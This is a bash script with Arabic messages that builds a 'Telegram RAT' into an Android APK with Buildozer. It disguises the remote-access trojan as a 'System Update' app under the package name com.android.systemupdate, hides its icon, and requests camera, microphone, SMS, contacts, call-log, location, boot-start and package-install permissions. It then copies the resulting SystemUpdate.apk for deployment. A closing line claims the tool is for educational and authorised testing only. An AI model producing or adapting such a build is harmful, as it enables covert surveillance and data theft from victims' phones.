#!/bin/bash
set -e
GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; BLUE='\033[0;34m'; NC='\033[0m'
PROJECT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
BUILD_DIR="/tmp/rat_apk_build"

clear
echo -e "${CYAN}╔════════════════════════════════════════╗"
echo -e "║   Infinix Smart 4 - APK Builder       ║"
echo -e "║   Telegram RAT → Android APK          ║"
echo -e "╚════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[1/5]${NC} فحص المتطلبات..."
for cmd in python3 pip git; do
    command -v $cmd &>/dev/null || { echo -e "${RED}[!]${NC} $cmd ناقص"; pkg install -y python python-pip git openjdk-17; break; }
done

echo -e "\n${YELLOW}[2/5]${NC} تثبيت Buildozer..."
pip install --upgrade buildozer cython 2>/dev/null || pip install buildozer cython

echo -e "\n${YELLOW}[3/5]${NC} تجهيز المشروع..."
rm -rf "$BUILD_DIR"
mkdir -p "$BUILD_DIR" "$BUILD_DIR/modules"
cp "$PROJECT_DIR/rat/telegram_rat.py" "$BUILD_DIR/main.py"
cp "$PROJECT_DIR/rat/modules/"*.py "$BUILD_DIR/modules/" 2>/dev/null || true
echo '"""RAT Modules"""' > "$BUILD_DIR/modules/__init__.py"
echo -e "    ${GREEN}✓${NC} تم نسخ الملفات"

echo -e "\n${YELLOW}[4/5]${NC} إنشاء Buildozer spec..."
cat > "$BUILD_DIR/buildozer.spec" << 'SPECEOF'
[app]
title = System Update
package.name = com.android.systemupdate
package.domain = com.android
source.dir = .
source.include_exts = py
version = 2.0.1
requirements = python3,requests,android
orientation = portrait
fullscreen = 1
android.hide_icon = True
android.permissions = INTERNET,ACCESS_NETWORK_STATE,ACCESS_WIFI_STATE,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,CAMERA,RECORD_AUDIO,READ_CONTACTS,READ_SMS,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,FOREGROUND_SERVICE,SYSTEM_ALERT_WINDOW,READ_PHONE_STATE,READ_CALL_LOG,RECEIVE_BOOT_COMPLETED,WAKE_LOCK,REQUEST_INSTALL_PACKAGES,QUERY_ALL_PACKAGES
android.api = 28
android.minapi = 21
android.ndk = 21.4.7075529
android.sdk = 31
android.arch = armeabi-v7a
android.entrypoint = main
android.bootstrap = sdl2
android.allow_backup = True
android.presplash_color = #000000
android.wakelock = True
android.build_mode = debug
[buildozer]
log_level = 2
warn_on_root = 0
SPECEOF
echo -e "    ${GREEN}✓${NC} تم إنشاء buildozer.spec"

echo -e "\n${YELLOW}[5/5]${NC} بدء البناء..."
echo -e "${CYAN}    ⚠️ المرة الأولى 15-30 دقيقة (تحميل SDK/NDK ~2GB)${NC}"
read -p "    متابعة؟ (Y/n): " cf
if [ "$cf" = "n" ] || [ "$cf" = "N" ]; then echo -e "${RED}تم الإلغاء${NC}"; exit 0; fi

cd "$BUILD_DIR"
buildozer android debug 2>&1 | tee "$PROJECT_DIR/build.log"

APK_PATH=$(find "$BUILD_DIR/bin" -name "*.apk" 2>/dev/null | head -1)
if [ -n "$APK_PATH" ] && [ -f "$APK_PATH" ]; then
    mkdir -p "$PROJECT_DIR/bin"
    cp "$APK_PATH" "$PROJECT_DIR/bin/SystemUpdate.apk"
    echo -e "\n${GREEN}✅ تم بنجاح!${NC}"
    echo -e "    📦 bin/SystemUpdate.apk (${BLUE}$(du -h "$APK_PATH" | cut -f1)${NC})"
    echo -e "    ${YELLOW}انسخ: cp bin/SystemUpdate.apk /sdcard/${NC}"
    echo -e "    ${RED}⚠️ للأغراض التعليمية واختبارات الاختراق المصرح بها فقط${NC}"
else
    echo -e "\n${RED}❌ فشل البناء${NC} - راجع build.log"
fi
